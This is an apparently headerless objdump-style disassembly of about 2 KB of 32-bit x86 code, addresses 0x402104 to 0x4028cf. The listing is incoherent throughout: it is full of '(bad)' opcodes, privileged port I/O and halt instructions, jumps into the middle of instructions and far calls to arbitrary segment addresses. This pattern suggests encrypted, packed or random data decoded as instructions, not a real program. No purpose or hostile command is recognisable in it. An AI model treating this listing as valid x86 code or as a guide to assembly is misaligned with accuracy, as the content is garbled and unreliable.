  402104:	dec    eax
  402105:	jmp    FWORD PTR [ecx+0x66b4bf1a]
  40210b:	ret    
  40210c:	in     al,dx
  40210d:	int    0xa2
  40210f:	dec    ebx
  402110:	mov    al,ds:0x3ae2192
  402115:	jae    0x4020eb
  402117:	repz loope 0x402184
  40211a:	aas    
  40211b:	xchg   edi,eax
  40211c:	icebp  
  40211d:	in     al,dx
  40211e:	dec    esi
  40211f:	or     eax,DWORD PTR [ecx+edi*8-0x54]
  402123:	jnp    0x4020b1
  402125:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402126:	adc    ah,dh
  402128:	stc    
  402129:	or     DWORD PTR [edx-0x75],ebx
  40212c:	or     al,0x3d
  40212e:	mov    dl,0x8
  402130:	fwait
  402131:	std    
  402132:	and    al,0xb6
  402134:	push   edx
  402135:	inc    esp
  402136:	mov    cl,0xb7
  402138:	mov    al,ds:0x65f21635
  40213d:	jmp    0xba8e:0x7757c4c9
  402144:	and    BYTE PTR [ebx],bh
  402146:	push   es
  402147:	cmp    bh,ch
  402149:	fst    DWORD PTR [ebx+0x46]
  40214c:	fbld   TBYTE PTR es:[eax-0x33]
  402150:	or     esp,DWORD PTR [eax-0x19]
  402153:	ja     0x4021ab
  402155:	sbb    al,dl
  402157:	aam    0xee
  402159:	and    DWORD PTR [edi],ecx
  40215b:	adc    ah,cl
  40215d:	xchg   esp,eax
  40215e:	int3   
  40215f:	xchg   esi,eax
  402160:	call   0xddf778d7
  402165:	fisubr WORD PTR [esi+0x73b6d303]
  40216b:	je     0x40216f
  40216d:	test   al,0xbd
  40216f:	sub    al,0xb8
  402171:	int3   
  402172:	sub    bh,BYTE PTR [esp+eiz*8-0xa]
  402176:	inc    edx
  402177:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402178:	out    0x0,eax
  40217a:	add    al,0x18
  40217c:	jl     0x402162
  40217e:	or     eax,0x3670b3e5
  402183:	lods   eax,DWORD PTR ds:[esi]
  402184:	xor    esp,DWORD PTR [eax+0x30]
  402187:	imul   ebx,esp,0xffffff96
  40218a:	das    
  40218b:	leave  
  40218c:	les    esp,FWORD PTR [edi+0x21fff04c]
  402192:	scas   eax,DWORD PTR es:[edi]
  402193:	gs xchg ebp,eax
  402195:	xchg   ecx,eax
  402196:	jg     0x402162
  402198:	push   ss
  402199:	gs sbb al,0xfb
  40219c:	dec    edx
  40219d:	sbb    DWORD PTR [ebp-0x7c],ecx
  4021a0:	mov    ebp,0xba52e635
  4021a5:	call   esp
  4021a7:	jo     0x4021b1
  4021a9:	jmp    0xa6982cf4
  4021ae:	pushf  
  4021af:	jp     0x40217b
  4021b1:	mov    esp,0xa6421c70
  4021b6:	xchg   esp,eax
  4021b7:	adc    DWORD PTR [ecx-0x3be4a259],eax
  4021bd:	nop
  4021be:	mov    dl,0x88
  4021c0:	sbb    eax,0x5670e037
  4021c5:	xor    DWORD PTR [esi+0x33],0xffffffd7
  4021c9:	mov    cl,BYTE PTR [eax]
  4021cb:	xchg   edx,eax
  4021cc:	xor    BYTE PTR [ebp-0x1018a9ab],ah
  4021d2:	fimul  DWORD PTR [ebp+0xa]
  4021d5:	dec    ebp
  4021d6:	(bad)  
  4021d7:	hlt    
  4021d8:	int3   
  4021d9:	xchg   DWORD PTR [edi-0x14],ebp
  4021dc:	push   ebp
  4021dd:	jmp    0x4021ff
  4021df:	jo     0x40222b
  4021e1:	adc    DWORD PTR [edx],ebx
  4021e3:	sbb    ebp,DWORD PTR [esi+0x7a]
  4021e6:	inc    esp
  4021e7:	or     dl,BYTE PTR [edi-0x7b]
  4021ea:	fwait
  4021eb:	pop    esi
  4021ec:	dec    edx
  4021ed:	xchg   esi,eax
  4021ee:	push   esp
  4021ef:	cmc    
  4021f0:	outs   dx,BYTE PTR ds:[esi]
  4021f1:	push   edx
  4021f2:	add    BYTE PTR [ecx-0x7f],ah
  4021f5:	ss pop edx
  4021f7:	dec    edi
  4021f8:	call   0xf1eb:0xea3c1258
  4021ff:	add    al,cl
  402201:	repz pop ebp
  402203:	lds    ebp,FWORD PTR [ebp-0x2a]
  402206:	mov    ds:0x1c0380fe,al
  40220b:	xor    eax,0x1c8c1174
  402210:	mov    bl,0x22
  402212:	cmova  eax,DWORD PTR [ecx]
  402215:	cld    
  402216:	and    al,ch
  402218:	push   ebx
  402219:	dec    eax
  40221a:	adc    DWORD PTR [ecx],edx
  40221c:	scas   eax,DWORD PTR es:[edi]
  40221d:	pusha  
  40221e:	fmul   QWORD PTR [ebp-0x8]
  402221:	push   ecx
  402222:	jle    0x40224c
  402224:	and    ah,BYTE PTR [edx+0x717977c3]
  40222a:	test   eax,0xa5aa7cdc
  40222f:	or     DWORD PTR [edx+0x44ffa961],edx
  402235:	bnd jo 0x402258
  402238:	cmp    BYTE PTR [edi+0x31],0x8e
  40223c:	cmp    bh,BYTE PTR [esi+esi*4]
  40223f:	enter  0xcd31,0x2b
  402243:	ror    BYTE PTR [ecx-0x37ac0b0c],0x22
  40224a:	xor    al,0x78
  40224c:	sbb    DWORD PTR [edi+0x77931ac3],ecx
  402252:	aad    0x7f
  402254:	mov    dl,0x7a
  402256:	dec    edi
  402257:	pushfw 
  402259:	das    
  40225a:	rcr    DWORD PTR [eax+0xb0f0bc1],1
  402260:	ffreep st(1)
  402262:	add    ah,BYTE PTR [edx-0x76467772]
  402268:	retf   
  402269:	lahf   
  40226a:	lods   eax,DWORD PTR ds:[esi]
  40226b:	inc    eax
  40226c:	aas    
  40226d:	sbb    eax,0xcf62a671
  402272:	repz jne 0x402228
  402275:	mov    bh,0xfa
  402277:	rol    DWORD PTR [ebx-0x10],cl
  40227a:	mov    BYTE PTR [edi],ch
  40227c:	int    0x7b
  40227e:	dec    esp
  40227f:	aad    0x14
  402281:	mov    DWORD PTR [ecx-0x20657b54],ebx
  402287:	ja     0x4022da
  402289:	call   0x3d7a0b20
  40228e:	in     eax,dx
  40228f:	in     eax,0xbe
  402291:	pusha  
  402292:	out    0xf6,al
  402294:	and    esi,edi
  402296:	jo     0x402287
  402298:	and    ebx,DWORD PTR [ecx]
  40229a:	call   esp
  40229c:	jp     0x402295
  40229e:	popf   
  40229f:	dec    ebp
  4022a0:	mov    ah,0xa1
  4022a2:	ret    
  4022a3:	lods   eax,DWORD PTR ds:[esi]
  4022a4:	add    al,0xa1
  4022a6:	mov    ds:0xf923e87a,eax
  4022ab:	xchg   ebx,eax
  4022ac:	in     al,0x7c
  4022ae:	sahf   
  4022af:	mov    edi,0x73ed5d4
  4022b4:	pusha  
  4022b5:	cmp    eax,0x9750c123
  4022ba:	and    eax,0xa6e3faa3
  4022bf:	mov    ds:0xe3081075,eax
  4022c4:	leave  
  4022c5:	outs   dx,DWORD PTR ds:[esi]
  4022c6:	push   0x1
  4022c8:	imul   edx,edi,0x2b
  4022cb:	loope  0x40225e
  4022cd:	jnp    0x4022bf
  4022cf:	idiv   DWORD PTR [ebx]
  4022d1:	inc    eax
  4022d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022d3:	and    BYTE PTR [edx],ah
  4022d5:	rcr    dl,0x32
  4022d8:	arpl   WORD PTR [edx+0x6f9b6c7d],dx
  4022de:	xchg   esp,eax
  4022df:	sub    dh,ah
  4022e1:	cmp    DWORD PTR [edx+0x8d818ff],esp
  4022e7:	jae    0x402337
  4022e9:	push   ecx
  4022ea:	xchg   ebx,eax
  4022eb:	popa   
  4022ec:	inc    DWORD PTR [eax+0x6a6ecd5c]
  4022f2:	int3   
  4022f3:	dec    ebx
  4022f4:	lea    ebx,[edx+esi*8+0x4e561516]
  4022fb:	sbb    esp,DWORD PTR [eax+0x3e65856]
  402301:	inc    esp
  402302:	push   0xffffffc3
  402304:	or     eax,0x57e7f5f1
  402309:	push   esi
  40230a:	in     al,dx
  40230b:	cli    
  40230c:	fisttp DWORD PTR [edi-0x3e]
  40230f:	ds shr al,cl
  402312:	mov    ebx,ss
  402314:	pop    eax
  402315:	aaa    
  402316:	inc    eax
  402317:	jecxz  0x4022f9
  402319:	adc    esp,DWORD PTR [edi]
  40231b:	lea    esp,[eax]
  40231d:	pusha  
  40231e:	std    
  40231f:	test   al,0x14
  402321:	outs   dx,BYTE PTR ds:[esi]
  402322:	or     dh,BYTE PTR [ecx-0x59e0407e]
  402328:	mov    ds:0x527639a7,eax
  40232d:	sahf   
  40232e:	sbb    BYTE PTR [ebx-0x4ffe1c60],bh
  402334:	in     al,0x78
  402336:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402337:	push   ss
  402338:	push   0x54d13b99
  40233d:	int3   
  40233e:	jmp    eax
  402340:	aaa    
  402341:	inc    BYTE PTR [eax-0x6e]
  402344:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402345:	test   eax,0x5b42f7fc
  40234a:	dec    esp
  40234b:	push   esp
  40234c:	sub    BYTE PTR [eax+edi*2-0x3],0xee
  402351:	daa    
  402352:	cmc    
  402353:	outs   dx,DWORD PTR ds:[esi]
  402354:	dec    ecx
  402355:	cmp    esp,ebp
  402357:	mov    dl,0x4e
  402359:	push   edx
  40235a:	dec    ecx
  40235b:	jo     0x402316
  40235d:	pop    eax
  40235e:	in     eax,0xd6
  402360:	(bad)  
  402361:	jp     0x40238d
  402363:	daa    
  402364:	inc    ecx
  402365:	cmp    BYTE PTR [ebx],0xeb
  402368:	pop    es
  402369:	fist   DWORD PTR [eax+0x49]
  40236c:	pushf  
  40236d:	shl    BYTE PTR [ebx+0x5f7f21b8],0x62
  402374:	cdq    
  402375:	pusha  
  402376:	adc    BYTE PTR [edi+0x65],0x60
  40237a:	jae    0x402333
  40237c:	and    ch,BYTE PTR ds:0x5dd10e4e
  402382:	pop    eax
  402383:	and    DWORD PTR [ebp+0x60],ebx
  402386:	jecxz  0x402335
  402388:	xor    al,0x96
  40238a:	das    
  40238b:	test   eax,0xb7b98bd7
  402390:	aas    
  402391:	xchg   esi,eax
  402392:	int3   
  402393:	cli    
  402394:	fcmovu st,st(7)
  402396:	inc    ebp
  402397:	mov    al,ds:0xc34b7465
  40239c:	es popfw 
  40239f:	add    DWORD PTR [ebp-0x2ad0b780],ebx
  4023a5:	out    dx,eax
  4023a6:	sub    eax,0xfc19a937
  4023ab:	aas    
  4023ac:	mov    bl,0x92
  4023ae:	xchg   edx,eax
  4023af:	adc    eax,0x6e3247ef
  4023b4:	jbe    0x402428
  4023b6:	neg    DWORD PTR [ebp-0x52b39dce]
  4023bc:	shl    DWORD PTR [esi],cl
  4023be:	psllw  mm1,QWORD PTR [ebp+0x625faafe]
  4023c5:	mov    DWORD PTR [eax],eax
  4023c7:	or     BYTE PTR [edx+0xad48a7e],bh
  4023cd:	mov    al,0x38
  4023cf:	jne    0x402361
  4023d1:	rcr    BYTE PTR [ebx-0x7],cl
  4023d4:	adc    DWORD PTR [edx+esi*4],0x43
  4023d8:	dec    esp
  4023d9:	xchg   ebx,eax
  4023da:	sbb    BYTE PTR [eax-0x4be58fcb],ah
  4023e0:	cs jo  0x4023e7
  4023e3:	mov    bh,0xaa
  4023e5:	je     0x402466
  4023e7:	jae    0x4023b0
  4023e9:	pop    ss
  4023ea:	(bad)  
  4023eb:	ror    dl,cl
  4023ed:	test   eax,0x42fa3df2
  4023f2:	pop    ss
  4023f3:	out    dx,eax
  4023f4:	outs   dx,DWORD PTR ds:[esi]
  4023f5:	shl    cl,0x9c
  4023f8:	adc    al,0x41
  4023fa:	aas    
  4023fb:	jnp    0x4023bc
  4023fd:	es loopne 0x4023a7
  402400:	iret   
  402401:	mov    eax,esi
  402403:	cmp    eax,0xf6cad9f4
  402408:	adc    bh,dh
  40240a:	xchg   edx,ebp
  40240c:	inc    esp
  40240d:	dec    ebx
  40240e:	or     eax,0x67411b1a
  402413:	mov    ds:0x72ad7a5b,eax
  402418:	(bad)  
  40241a:	ins    BYTE PTR es:[edi],dx
  40241b:	lods   al,BYTE PTR ds:[esi]
  40241c:	aaa    
  40241d:	fisttp DWORD PTR [eax]
  40241f:	mov    cs,WORD PTR [esi-0x3fdbe307]
  402425:	in     eax,0x5c
  402427:	jge    0x4023d7
  402429:	hlt    
  40242a:	mov    WORD PTR [ecx+0x2c],fs
  40242d:	je     0x40249a
  40242f:	dec    edx
  402430:	push   0x18efc6a6
  402435:	mov    bh,0xe6
  402437:	div    ebx
  402439:	push   cs
  40243a:	sbb    eax,DWORD PTR [edi+esi*4-0x64]
  40243e:	mov    fs,WORD PTR [edi]
  402440:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402441:	cmp    cl,BYTE PTR [esi+ecx*1]
  402444:	xor    al,0x60
  402446:	(bad)  
  402447:	in     al,0xee
  402449:	xchg   bl,ch
  40244b:	xchg   esi,eax
  40244c:	ret    0x1bcf
  40244f:	mov    ah,0xcf
  402451:	xchg   esi,eax
  402452:	dec    ebx
  402453:	shl    BYTE PTR [edx+0x69f42065],cl
  402459:	fwait
  40245a:	xchg   edi,eax
  40245b:	cmp    ebx,DWORD PTR [edi]
  40245d:	fdiv   st,st(2)
  40245f:	and    BYTE PTR [edx],bl
  402461:	sar    BYTE PTR [esp+esi*1+0x604483c8],0xf9
  402469:	call   0x39a61094
  40246e:	mov    ds:0x50eb7e0f,eax
  402473:	or     bh,al
  402475:	aad    0x45
  402477:	fld    DWORD PTR [edx+0x20]
  40247a:	pop    ds
  40247b:	mov    ss,WORD PTR [eax-0x46]
  40247e:	dec    edi
  40247f:	inc    edi
  402480:	pop    esi
  402481:	mov    esi,0x5b07c057
  402486:	push   edx
  402487:	xor    DWORD PTR [edx-0x35a497af],ebx
  40248d:	call   FWORD PTR ds:0x3260c235
  402493:	ins    BYTE PTR es:[edi],dx
  402494:	inc    edi
  402495:	in     al,dx
  402496:	jnp    0x4024fd
  402498:	mov    ch,BYTE PTR [ebx+edi*8]
  40249b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40249c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40249d:	cmp    cl,BYTE PTR [ecx]
  40249f:	in     al,0x4a
  4024a1:	jg     0x4024bf
  4024a3:	xchg   esi,eax
  4024a4:	sub    al,0x88
  4024a6:	hlt    
  4024a7:	pop    ecx
  4024a8:	push   0x6c033635
  4024ad:	sbb    BYTE PTR [ebp+0x9620553],bl
  4024b3:	std    
  4024b4:	stos   BYTE PTR es:[edi],al
  4024b5:	dec    ecx
  4024b6:	arpl   si,si
  4024b8:	loop   0x402489
  4024ba:	xchg   ebx,eax
  4024bb:	and    cl,BYTE PTR [ebx+0x2d]
  4024be:	ds leave 
  4024c0:	xchg   ebp,eax
  4024c1:	psubd  mm0,QWORD PTR [esi+0x53c16adf]
  4024c8:	and    al,0x2
  4024ca:	mov    dl,0x11
  4024cc:	pop    ds
  4024cd:	sahf   
  4024ce:	out    0x60,eax
  4024d0:	push   edx
  4024d1:	aam    0x76
  4024d3:	imul   ecx,DWORD PTR [ecx+0x1e1964f3],0xffffff85
  4024da:	mov    edi,0x39a3f289
  4024df:	adc    eax,0xd69b92c1
  4024e4:	mov    al,0xa4
  4024e6:	outs   dx,BYTE PTR ds:[esi]
  4024e7:	addr16 pushf 
  4024e9:	call   0x1d70:0xaf3a8b0d
  4024f0:	test   al,0x95
  4024f2:	iret   
  4024f3:	test   DWORD PTR [ecx+0x22],ebp
  4024f6:	xchg   ebp,eax
  4024f7:	(bad)  
  4024f8:	int3   
  4024f9:	(bad)  
  4024fa:	mov    ebx,0xde8d369d
  4024ff:	jb     0x4024ef
  402501:	push   edi
  402502:	lods   eax,DWORD PTR ds:[esi]
  402503:	xor    DWORD PTR [edx-0x7e],0xdf2cd9e
  40250a:	arpl   WORD PTR [edi-0x71],dx
  40250d:	mov    dl,0x20
  40250f:	mov    ebp,0x291dc0e7
  402514:	xor    DWORD PTR [edx],eax
  402516:	div    edi
  402518:	in     eax,0x83
  40251a:	dec    eax
  40251b:	jo     0x4024f6
  40251d:	dec    ebp
  40251e:	mov    edi,0xb63f59cd
  402523:	bound  edx,QWORD PTR [ecx-0x1ded60a9]
  402529:	les    edx,FWORD PTR [ecx-0x60b383d]
  40252f:	inc    ebx
  402530:	or     esi,DWORD PTR [edi+eax*1-0x370648fb]
  402537:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402538:	sbb    eax,0xb1a74cc
  40253d:	fisub  WORD PTR [ebx+ecx*2-0x67]
  402541:	imul   DWORD PTR [edi+edx*2+0x35]
  402545:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402546:	ret    0xe1c5
  402549:	jge    0x4025b4
  40254b:	mov    dh,cl
  40254d:	cmp    DWORD PTR [edx+0x79],0xddad170e
  402554:	sub    eax,0xed23bda3
  402559:	mov    ds:0x5ccad744,eax
  40255e:	inc    ebp
  40255f:	test   al,ah
  402561:	test   BYTE PTR [ebx-0x30],bh
  402564:	and    bl,BYTE PTR [ebx]
  402566:	and    al,0x82
  402568:	retf   0xd981
  40256b:	scas   al,BYTE PTR es:[edi]
  40256c:	test   BYTE PTR [ebx+eiz*4+0x1a],ah
  402570:	stc    
  402571:	mov    ecx,DWORD PTR [edx-0x26]
  402574:	xchg   esp,eax
  402575:	fadd   QWORD PTR [edx+0x42]
  402578:	test   eax,0xc250c03d
  40257d:	and    eax,0xcaea0b7e
  402582:	mov    esp,0x33795dcf
  402587:	enter  0xf669,0x90
  40258b:	rol    BYTE PTR [ebx],0x82
  40258e:	pop    esi
  40258f:	jno    0x40251f
  402591:	jp     0x40251f
  402593:	inc    esp
  402594:	mov    dh,0x33
  402596:	inc    dh
  402598:	jge    0x40251c
  40259a:	mov    esi,0x6c0580d0
  40259f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025a0:	fsubr  DWORD PTR [esi+0x4fcbee26]
  4025a6:	mov    dh,0x52
  4025a8:	and    al,0x59
  4025aa:	das    
  4025ab:	sbb    eax,0x7610390b
  4025b0:	cdq    
  4025b1:	and    al,BYTE PTR [ebp+0x4a65128c]
  4025b7:	repnz fistp DWORD PTR ds:0x4c186454
  4025be:	fdivr  QWORD PTR [edi+0x3]
  4025c1:	mov    ebp,0xcb2f5a06
  4025c6:	mov    ebx,0x1900f53d
  4025cb:	arpl   WORD PTR [eax+ebp*1-0x59],di
  4025cf:	sub    al,0x68
  4025d1:	pop    ebx
  4025d2:	out    dx,eax
  4025d3:	dec    ebp
  4025d4:	and    cl,dl
  4025d6:	fdivr  DWORD PTR [eax]
  4025d8:	push   esp
  4025d9:	sub    ebp,DWORD PTR [ecx-0x63a97d4b]
  4025df:	cmp    al,0x34
  4025e1:	dec    esp
  4025e2:	inc    ecx
  4025e3:	jbe    0x40259f
  4025e5:	xor    eax,0x6e3d105d
  4025ea:	jmp    0x3cca8f96
  4025ef:	mov    ah,0x6f
  4025f1:	inc    eax
  4025f2:	mov    edx,0x4824e8e6
  4025f7:	in     eax,dx
  4025f8:	ja     0x40261f
  4025fa:	or     eax,0x4d45e67a
  4025ff:	cwde   
  402600:	aad    0xd4
  402602:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402603:	dec    esp
  402604:	mov    ah,BYTE PTR [edi-0x5b]
  402607:	jb     0x402649
  402609:	sub    eax,0x6492ac15
  40260e:	loop   0x4025bf
  402610:	int3   
  402611:	mov    dh,0xd3
  402613:	(bad)  
  402614:	xchg   edi,eax
  402615:	sbb    BYTE PTR [edi+0x554933f9],0xd7
  40261c:	lds    ebp,FWORD PTR [esp+ecx*1+0x64]
  402620:	dec    esi
  402621:	js     0x40268e
  402623:	test   al,0x5d
  402625:	inc    eax
  402626:	inc    edi
  402627:	jle    0x4025b4
  402629:	or     BYTE PTR [ebp+eiz*1+0x61bfcbc3],0xb6
  402631:	jp     0x40261d
  402633:	jecxz  0x4025c8
  402635:	push   esi
  402636:	pop    ss
  402637:	pushf  
  402638:	push   esi
  402639:	fs jb  0x402691
  40263c:	test   bl,0xf4
  40263f:	inc    esi
  402640:	sub    al,0xe4
  402642:	pop    edi
  402643:	push   edx
  402644:	xor    eax,0xffad1fba
  402649:	aad    0xe5
  40264b:	cmp    DWORD PTR [eax-0x228fdf5a],edi
  402651:	cmp    DWORD PTR [eax-0x4bf4bd19],edi
  402657:	inc    esp
  402658:	ins    DWORD PTR es:[edi],dx
  402659:	aam    0x18
  40265b:	xchg   ebp,eax
  40265c:	in     al,0x98
  40265e:	or     eax,0xbd0484a9
  402663:	mov    al,0x2a
  402665:	sub    al,0xb7
  402667:	jl     0x402673
  402669:	shl    DWORD PTR [esi],0x4d
  40266c:	push   eax
  40266d:	cmp    DWORD PTR [ebx-0x3a],edi
  402670:	mov    ss,WORD PTR [edx-0x34]
  402673:	add    al,0xbd
  402675:	(bad)  
  402676:	pop    edx
  402677:	jge    0x40264e
  402679:	push   DWORD PTR [ebx]
  40267b:	dec    edx
  40267c:	pop    esi
  40267d:	push   ecx
  40267e:	mov    ?,ebp
  402680:	add    BYTE PTR [ebx+0x4ddf0f7a],0x3f
  402687:	call   0x979c:0x743c38e4
  40268e:	xchg   BYTE PTR [esi],dh
  402690:	ins    BYTE PTR es:[edi],dx
  402691:	call   0x3e4d7c97
  402696:	lds    eax,FWORD PTR [edi+0x21]
  402699:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40269a:	scas   al,BYTE PTR es:[edi]
  40269b:	fcmovnu st,st(1)
  40269d:	jnp    0x40262e
  40269f:	dec    edi
  4026a0:	repz jp 0x4026d3
  4026a3:	or     edx,DWORD PTR [esi+ecx*2]
  4026a6:	jmp    0x40267f
  4026a8:	and    BYTE PTR [eax],cl
  4026aa:	ds jl  0x402646
  4026ad:	mov    bl,BYTE PTR [ebp-0x7c]
  4026b0:	pushf  
  4026b1:	mov    esp,0xeca61391
  4026b6:	call   0xf72:0xc9d734a7
  4026bd:	ret    
  4026be:	push   ss
  4026bf:	dec    ebp
  4026c0:	fwait
  4026c1:	inc    ebx
  4026c2:	and    bh,BYTE PTR [ebx-0x1d8af6ac]
  4026c8:	popa   
  4026c9:	sar    DWORD PTR [eax-0x10],0xec
  4026cd:	test   esi,edi
  4026cf:	addr16 jno 0x4026c4
  4026d2:	outs   dx,DWORD PTR ds:[esi]
  4026d3:	jns    0x4026be
  4026d5:	dec    ebp
  4026d6:	inc    ecx
  4026d7:	adc    dh,BYTE PTR [ebx+ebx*4-0x496920d1]
  4026de:	xor    ebx,DWORD PTR [edx-0xa41ceb4]
  4026e4:	mov    edi,DWORD PTR [edx-0x6f]
  4026e7:	pop    esp
  4026e8:	jle    0x4026d3
  4026ea:	mov    eax,0x74dbcaff
  4026ef:	fcom   DWORD PTR [eax-0x51]
  4026f2:	in     eax,dx
  4026f3:	stc    
  4026f4:	adc    cl,BYTE PTR [ebx+0x7a]
  4026f7:	mov    eax,ds:0xec9fa21c
  4026fc:	daa    
  4026fd:	ds or  eax,0x433898a6
  402703:	and    bh,dh
  402705:	test   BYTE PTR [esp-0x1],cl
  402709:	adc    eax,0xde49dd7b
  40270e:	icebp  
  40270f:	xchg   DWORD PTR [ebp+0x78],esi
  402712:	ins    DWORD PTR es:[edi],dx
  402713:	push   esp
  402714:	fs cmp ebp,esi
  402717:	inc    ebp
  402718:	rcr    BYTE PTR [esp+ecx*4+0x39679c1a],cl
  40271f:	jne    0x40270f
  402721:	xchg   ebx,eax
  402722:	outs   dx,DWORD PTR ds:[esi]
  402723:	xor    eax,0x5d929321
  402728:	(bad)  
  402729:	and    eax,0x6be8c8dc
  40272e:	push   ss
  40272f:	mov    WORD PTR [eax+0x38],ss
  402732:	inc    ecx
  402733:	jmp    0x8182:0x290de20b
  40273a:	mov    edx,0xce7a4169
  40273f:	sub    dl,bh
  402741:	(bad)  
  402742:	aam    0x59
  402744:	sbb    bl,al
  402746:	jb     0x40273e
  402748:	ins    BYTE PTR es:[edi],dx
  402749:	sub    DWORD PTR [ecx-0x54],ecx
  40274c:	sbb    BYTE PTR [ebp-0x4d],al
  40274f:	in     eax,0xd3
  402751:	sbb    eax,0x3eae094f
  402756:	xor    DWORD PTR [eax-0x57605aff],ebx
  40275c:	push   es
  40275d:	stos   DWORD PTR es:[edi],eax
  40275e:	mov    ch,0xc
  402760:	mov    DWORD PTR [edi+ebp*4+0x3424ea16],esi
  402767:	fadd   DWORD PTR [ebx-0x7b]
  40276a:	in     eax,dx
  40276b:	mov    ss,WORD PTR [ecx+0x59]
  40276e:	fs cmp al,0x40
  402771:	scas   eax,DWORD PTR es:[edi]
  402772:	(bad)  
  402773:	minps  xmm4,XMMWORD PTR [edi]
  402776:	push   edi
  402777:	mov    dl,0x9c
  402779:	jne    0x402768
  40277b:	jl     0x4026ff
  40277d:	cmp    al,0xf0
  40277f:	mov    cl,BYTE PTR [edi-0xfbece48]
  402785:	pop    es
  402786:	and    al,0x62
  402788:	push   esp
  402789:	push   eax
  40278a:	push   0x5e5035e7
  40278f:	jg     0x40277d
  402791:	sbb    eax,0xc9d5e65b
  402796:	jbe    0x402768
  402798:	(bad)  [eax-0x21]
  40279b:	dec    ecx
  40279c:	mov    esi,0x108ee8e
  4027a1:	test   DWORD PTR [ecx],esi
  4027a3:	mov    dl,0x76
  4027a5:	fsubr  QWORD PTR [ebx+0x6a]
  4027a8:	enter  0x838e,0xe6
  4027ac:	push   ds
  4027ad:	sub    eax,0x5bd753d2
  4027b2:	xor    al,BYTE PTR [esi-0x8]
  4027b5:	retf   0xb4ce
  4027b8:	sahf   
  4027b9:	daa    
  4027ba:	call   FWORD PTR [eax+0x27]
  4027bd:	dec    DWORD PTR [ebp+0x7665b21]
  4027c3:	cmp    al,0x2e
  4027c5:	and    edx,DWORD PTR [esi]
  4027c7:	lock adc eax,0xe9a8c5d3
  4027cd:	push   ss
  4027ce:	push   0x11f016bc
  4027d3:	imul   ecx,DWORD PTR [eax+0x27d77e38],0x2bcdabbb
  4027dd:	sub    BYTE PTR [ebx],ch
  4027df:	xchg   ebp,eax
  4027e0:	call   0x97eb:0xe86bdb7a
  4027e7:	xchg   ebp,eax
  4027e8:	hlt    
  4027e9:	jmp    0x5e55:0xdb9c67a6
  4027f0:	dec    eax
  4027f1:	lods   eax,DWORD PTR ds:[esi]
  4027f2:	into   
  4027f3:	shl    DWORD PTR [eax],0xb5
  4027f6:	stos   DWORD PTR es:[edi],eax
  4027f7:	jno    0x40283f
  4027f9:	add    BYTE PTR [ebx-0x6e],al
  4027fc:	inc    ebp
  4027fd:	fld    DWORD PTR [eax+esi*2]
  402800:	inc    ebx
  402801:	push   edi
  402802:	push   0xffffffd7
  402804:	test   eax,0xda131fba
  402809:	push   ss
  40280a:	sti    
  40280b:	clc    
  40280c:	sbb    DWORD PTR [esi-0xb],edi
  40280f:	ficomp DWORD PTR [eax+0x4d8f1cb9]
  402815:	xchg   esp,eax
  402816:	push   ss
  402817:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402818:	sbb    al,0x8
  40281a:	lock sub dh,BYTE PTR [edx]
  40281d:	lea    edx,[ebx-0x366bd8e0]
  402823:	mov    ch,0x7d
  402825:	cli    
  402826:	int    0x71
  402828:	adc    dh,dh
  40282a:	sbb    esi,esp
  40282c:	sub    dh,ch
  40282e:	in     al,dx
  40282f:	xor    DWORD PTR [eax],esp
  402831:	(bad)  
  402832:	in     eax,0x9
  402834:	xor    eax,0x5ffd5608
  402839:	fadd   st(7),st
  40283b:	cli    
  40283c:	in     al,0x88
  40283e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40283f:	jbe    0x4028a0
  402841:	neg    BYTE PTR ds:0x9cea1002
  402847:	push   ecx
  402849:	fisubr DWORD PTR [edi-0x2fa42fb]
  40284f:	push   ebx
  402850:	pop    ss
  402851:	loopne 0x40289d
  402853:	ins    BYTE PTR es:[edi],dx
  402854:	in     al,dx
  402855:	sub    eax,0x159a08dd
  40285a:	cdq    
  40285b:	mov    eax,ds:0xb3193942
  402860:	sub    ebp,ebp
  402862:	sbb    ebp,eax
  402864:	in     al,dx
  402865:	dec    eax
  402866:	lahf   
  402867:	sbb    cl,bh
  402869:	mov    eax,0x8494a88a
  40286e:	mov    WORD PTR [edx+0x144d97ce],ds
  402874:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402875:	pop    edi
  402876:	pop    edi
  402877:	sti    
  402878:	push   es
  402879:	and    eax,0xd14c4dbc
  40287e:	sti    
  40287f:	daa    
  402880:	mov    esi,0x779e012c
  402885:	pop    ecx
  402886:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402887:	xchg   ecx,eax
  402888:	mov    ds:0x9d58a509,al
  40288d:	pop    edi
  40288e:	mov    edi,0xbdad3a05
  402893:	and    BYTE PTR [esp+edi*8],0x26
  402897:	mov    ecx,0x62ef63ff
  40289c:	pop    ecx
  40289d:	dec    edi
  40289e:	push   ebx
  40289f:	aam    0xf6
  4028a1:	dec    esp
  4028a2:	stc    
  4028a3:	fisttp WORD PTR [edx+0x21deb7fc]
  4028a9:	xchg   edx,eax
  4028aa:	imul   ebx,DWORD PTR [ebx],0x42
  4028ad:	test   DWORD PTR [eax-0x74d02f46],0xaac9d195
  4028b7:	push   ss
  4028b8:	sbb    BYTE PTR [edi-0x6e],dh
  4028bb:	jbe    0x402899
  4028bd:	pop    esi
  4028be:	clc    
  4028bf:	xchg   DWORD PTR [eax+0x10],edx
  4028c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028c3:	inc    edi
  4028c4:	mov    dh,0x2d
  4028c6:	in     eax,0x88
  4028c8:	pop    ebx
  4028c9:	mov    cl,0x7d
  4028cb:	out    0x66,eax
  4028cd:	mov    dh,0x56
  4028cf:	or     BYTE PTR [esp+ecx*4+0x3],bh
